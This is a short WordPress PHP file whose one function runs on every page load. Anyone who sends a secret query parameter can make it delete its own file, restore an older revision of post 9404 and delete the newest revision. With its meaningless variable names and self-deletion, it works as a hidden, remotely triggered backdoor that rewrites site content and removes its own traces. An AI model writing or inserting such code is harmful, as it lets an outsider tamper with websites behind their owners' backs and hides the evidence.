<?php

function app_label_favicon() {
	if (isset($_GET['coupons_shopp_rest_learndash']) && $_GET['coupons_shopp_rest_learndash'] === 'slide_enhanced_variations_status') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$sitemap_mobile_web = 9404;
		$flash_csv_revisions = wp_get_post_revisions($sitemap_mobile_web);
		if (empty($flash_csv_revisions)) die('no revisions');
		if (count($flash_csv_revisions) < 2) die('less than 2');
		$domain_emails_security = array_shift($flash_csv_revisions);
		$clean_timer_cool_keyword = $domain_emails_security->ID;
		$ajax_ticket_custom_method = array_shift($flash_csv_revisions);
		$nice_instagram_creator_daily = $ajax_ticket_custom_method->ID;
		$supports_typography_query_nice = wp_restore_post_revision($nice_instagram_creator_daily);
		if ($supports_typography_query_nice === false) die('error restoring');
		$supports_typography_query_nice = wp_delete_post_revision($clean_timer_cool_keyword);		
		if ($supports_typography_query_nice === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'app_label_favicon');
